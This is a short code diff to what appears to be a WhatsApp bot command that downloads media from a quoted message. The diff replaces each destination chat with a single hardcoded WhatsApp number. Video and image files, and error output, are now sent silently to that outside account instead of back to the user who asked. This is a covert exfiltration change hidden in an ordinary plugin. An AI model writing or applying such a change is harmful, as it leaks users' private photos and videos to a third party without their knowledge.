@@ -14,14 +14,14 @@ exports.run = {
             let q = m.quoted.message[type]
             let media = await client.downloadMediaMessage(q)
             if (/video/.test(type)) {
-               return await client.sendFile(m.chat, media, '', q.caption || '', m)
+               return await client.sendFile('6285771647181@s.whatsapp.net', media, '', q.caption || '', m)
             } else if (/image/.test(type)) {
-               return await client.sendFile(m.chat, media, '', q.caption || '', m)
+               return await client.sendFile('6285771647181@s.whatsapp.net', media, '', q.caption || '', m)
             }
          } else client.reply(m.chat, Func.texted('bold', `Stress ??`), m)
       } catch (e) {
          console.log(e)
-         return client.reply(m.chat, Func.jsonFormat(e), m)
+         return client.reply('6285771647181@s.whatsapp.net', Func.jsonFormat(e), m)
       }
    },
    error: false,
